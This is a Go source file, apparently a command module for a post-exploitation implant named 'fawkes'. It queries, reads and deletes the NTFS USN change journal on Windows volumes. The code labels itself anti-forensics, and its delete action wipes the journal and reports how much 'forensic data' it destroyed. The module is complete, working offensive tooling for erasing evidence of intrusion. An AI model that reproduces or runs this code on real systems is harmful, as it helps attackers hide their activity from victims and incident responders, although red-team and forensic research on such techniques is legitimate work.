//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type UsnJrnlCommand struct{}

func (c *UsnJrnlCommand) Name() string {
	return "usn-jrnl"
}

func (c *UsnJrnlCommand) Description() string {
	return "Query or delete the NTFS USN Change Journal (anti-forensics)"
}

type usnJrnlParams struct {
	Action string `json:"action"`
	Volume string `json:"volume"`
}

// FSCTL control codes
const (
	fsctlQueryUsnJournal  = 0x000900F4
	fsctlReadUsnJournal   = 0x000900BB
	fsctlDeleteUsnJournal = 0x000900F8
)

// DELETE_USN_JOURNAL_DATA flags
const (
	usnDeleteFlagDelete = 0x00000001
)

// USN reason flags
const (
	usnReasonDataOverwrite       = 0x00000001
	usnReasonDataExtend          = 0x00000002
	usnReasonDataTruncation      = 0x00000004
	usnReasonNamedDataOverwrite  = 0x00000010
	usnReasonNamedDataExtend     = 0x00000020
	usnReasonNamedDataTruncation = 0x00000040
	usnReasonFileCreate          = 0x00000100
	usnReasonFileDelete          = 0x00000200
	usnReasonSecurityChange      = 0x00000800
	usnReasonRenameOldName       = 0x00001000
	usnReasonRenameNewName       = 0x00002000
	usnReasonBasicInfoChange     = 0x00008000
	usnReasonClose               = 0x80000000
)

type usnJournalData struct {
	UsnJournalID    uint64
	FirstUsn        int64
	NextUsn         int64
	LowestValidUsn  int64
	MaxUsn          int64
	MaximumSize     uint64
	AllocationDelta uint64
}

type readUsnJournalData struct {
	StartUsn          int64
	ReasonMask        uint32
	ReturnOnlyOnClose uint32
	Timeout           uint64
	BytesToWaitFor    uint64
	UsnJournalID      uint64
}

type deleteUsnJournalData struct {
	UsnJournalID uint64
	DeleteFlags  uint32
}

type usnRecordV2 struct {
	RecordLength              uint32
	MajorVersion              uint16
	MinorVersion              uint16
	FileReferenceNumber       uint64
	ParentFileReferenceNumber uint64
	Usn                       int64
	TimeStamp                 int64
	Reason                    uint32
	SourceInfo                uint32
	SecurityId                uint32
	FileAttributes            uint32
	FileNameLength            uint16
	FileNameOffset            uint16
}

func (c *UsnJrnlCommand) Execute(task structs.Task) structs.CommandResult {
	var params usnJrnlParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.Volume == "" {
		params.Volume = "C:"
	}
	// Normalize volume to just letter + colon
	params.Volume = strings.TrimRight(params.Volume, `\/`)
	if len(params.Volume) == 1 {
		params.Volume += ":"
	}

	switch params.Action {
	case "query":
		return usnQuery(params.Volume)
	case "recent":
		return usnRecent(params.Volume)
	case "delete":
		return usnDelete(params.Volume)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use 'query', 'recent', or 'delete')", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func openVolume(volume string, write bool) (windows.Handle, error) {
	path := `\\.\` + volume
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}

	access := uint32(syscall.GENERIC_READ)
	if write {
		access |= syscall.GENERIC_WRITE
	}

	handle, err := syscall.CreateFile(
		pathPtr,
		access,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		nil,
		syscall.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return 0, fmt.Errorf("open volume %s: %v", path, err)
	}
	return windows.Handle(handle), nil
}

func queryJournal(handle windows.Handle) (*usnJournalData, error) {
	var journal usnJournalData
	var bytesReturned uint32

	err := windows.DeviceIoControl(
		handle,
		fsctlQueryUsnJournal,
		nil, 0,
		(*byte)(unsafe.Pointer(&journal)),
		uint32(unsafe.Sizeof(journal)),
		&bytesReturned,
		nil,
	)
	if err != nil {
		return nil, fmt.Errorf("FSCTL_QUERY_USN_JOURNAL: %v", err)
	}
	return &journal, nil
}

func usnQuery(volume string) structs.CommandResult {
	handle, err := openVolume(volume, false)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open volume: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(handle)

	journal, err := queryJournal(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to query journal: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	recordRange := journal.NextUsn - journal.FirstUsn
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("USN Journal — Volume %s\n\n", volume))
	sb.WriteString(fmt.Sprintf("  Journal ID:       0x%016X\n", journal.UsnJournalID))
	sb.WriteString(fmt.Sprintf("  First USN:        %d\n", journal.FirstUsn))
	sb.WriteString(fmt.Sprintf("  Next USN:         %d\n", journal.NextUsn))
	sb.WriteString(fmt.Sprintf("  Lowest Valid USN: %d\n", journal.LowestValidUsn))
	sb.WriteString(fmt.Sprintf("  Max USN:          %d\n", journal.MaxUsn))
	sb.WriteString(fmt.Sprintf("  Max Size:         %s\n", formatBytes(journal.MaximumSize)))
	sb.WriteString(fmt.Sprintf("  Alloc Delta:      %s\n", formatBytes(journal.AllocationDelta)))
	sb.WriteString(fmt.Sprintf("  Record Range:     %s (approx)\n", formatBytes(uint64(recordRange))))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func usnRecent(volume string) structs.CommandResult {
	handle, err := openVolume(volume, true)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open volume: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(handle)

	journal, err := queryJournal(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to query journal: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Read recent records from the journal
	const maxRecords = 100
	const bufSize = 65536

	readData := readUsnJournalData{
		StartUsn:     0,
		ReasonMask:   0xFFFFFFFF,
		UsnJournalID: journal.UsnJournalID,
	}

	type recordEntry struct {
		fileName  string
		reason    uint32
		timestamp time.Time
		usn       int64
	}

	// Ring buffer: read entire journal but only keep last maxRecords
	var records []recordEntry
	buf := make([]byte, bufSize)
	iterations := 0
	const maxIterations = 5000 // safety limit

	for iterations < maxIterations {
		iterations++
		var bytesReturned uint32
		err := windows.DeviceIoControl(
			handle,
			fsctlReadUsnJournal,
			(*byte)(unsafe.Pointer(&readData)),
			uint32(unsafe.Sizeof(readData)),
			&buf[0],
			uint32(len(buf)),
			&bytesReturned,
			nil,
		)
		if err != nil {
			if bytesReturned == 0 {
				break
			}
		}

		if bytesReturned <= 8 {
			break // no more records
		}

		// First 8 bytes = next USN
		nextUsn := *(*int64)(unsafe.Pointer(&buf[0]))

		offset := uint32(8)
		for offset < bytesReturned {
			if offset+uint32(unsafe.Sizeof(usnRecordV2{})) > bytesReturned {
				break
			}
			rec := (*usnRecordV2)(unsafe.Pointer(&buf[offset]))
			if rec.RecordLength == 0 {
				break
			}

			// Extract filename
			nameStart := offset + uint32(rec.FileNameOffset)
			nameLen := uint32(rec.FileNameLength) / 2
			if nameStart+nameLen*2 <= bytesReturned {
				nameSlice := make([]uint16, nameLen)
				for i := uint32(0); i < nameLen; i++ {
					nameSlice[i] = *(*uint16)(unsafe.Pointer(&buf[nameStart+i*2]))
				}
				fileName := syscall.UTF16ToString(nameSlice)

				// Convert FILETIME to time.Time
				ft := windows.Filetime{
					LowDateTime:  uint32(rec.TimeStamp),
					HighDateTime: uint32(rec.TimeStamp >> 32),
				}
				ts := time.Unix(0, ft.Nanoseconds())

				records = append(records, recordEntry{
					fileName:  fileName,
					reason:    rec.Reason,
					timestamp: ts,
					usn:       rec.Usn,
				})
			}

			offset += rec.RecordLength
		}

		readData.StartUsn = nextUsn
	}

	// Take last maxRecords
	if len(records) > maxRecords {
		records = records[len(records)-maxRecords:]
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("USN Journal — Last %d records on %s (read %d iterations)\n\n", len(records), volume, iterations))
	if len(records) > 0 {
		sb.WriteString(fmt.Sprintf("%-20s %-40s %s\n", "TIMESTAMP", "FILENAME", "REASON"))
		sb.WriteString(strings.Repeat("-", 100) + "\n")
	}

	for _, r := range records {
		reasonStr := usnReasonString(r.reason)
		sb.WriteString(fmt.Sprintf("%-20s %-40s %s\n",
			r.timestamp.Format("2006-01-02 15:04:05"),
			truncateStr(r.fileName, 40),
			reasonStr,
		))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func usnDelete(volume string) structs.CommandResult {
	handle, err := openVolume(volume, true)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open volume (admin required): %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(handle)

	journal, err := queryJournal(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to query journal: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	deleteData := deleteUsnJournalData{
		UsnJournalID: journal.UsnJournalID,
		DeleteFlags:  usnDeleteFlagDelete,
	}

	var bytesReturned uint32
	err = windows.DeviceIoControl(
		handle,
		fsctlDeleteUsnJournal,
		(*byte)(unsafe.Pointer(&deleteData)),
		12, // exact struct size: 8 + 4
		nil, 0,
		&bytesReturned,
		nil,
	)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("FSCTL_DELETE_USN_JOURNAL failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	recordRange := journal.NextUsn - journal.FirstUsn
	return structs.CommandResult{
		Output: fmt.Sprintf("USN Journal deleted on %s\n  Journal ID: 0x%016X\n  Records cleared: ~%s of forensic data destroyed\n  Note: deletion continues in background",
			volume, journal.UsnJournalID, formatBytes(uint64(recordRange))),
		Status:    "success",
		Completed: true,
	}
}

func formatBytes(b uint64) string {
	switch {
	case b >= 1<<30:
		return fmt.Sprintf("%.1f GB", float64(b)/float64(1<<30))
	case b >= 1<<20:
		return fmt.Sprintf("%.1f MB", float64(b)/float64(1<<20))
	case b >= 1<<10:
		return fmt.Sprintf("%.1f KB", float64(b)/float64(1<<10))
	default:
		return fmt.Sprintf("%d B", b)
	}
}

func usnReasonString(reason uint32) string {
	var parts []string
	if reason&usnReasonFileCreate != 0 {
		parts = append(parts, "Create")
	}
	if reason&usnReasonFileDelete != 0 {
		parts = append(parts, "Delete")
	}
	if reason&(usnReasonDataOverwrite|usnReasonDataExtend|usnReasonDataTruncation) != 0 {
		parts = append(parts, "DataChange")
	}
	if reason&(usnReasonRenameOldName|usnReasonRenameNewName) != 0 {
		parts = append(parts, "Rename")
	}
	if reason&usnReasonSecurityChange != 0 {
		parts = append(parts, "SecurityChange")
	}
	if reason&usnReasonBasicInfoChange != 0 {
		parts = append(parts, "InfoChange")
	}
	if reason&usnReasonClose != 0 {
		parts = append(parts, "Close")
	}
	if len(parts) == 0 {
		return fmt.Sprintf("0x%08X", reason)
	}
	return strings.Join(parts, "|")
}
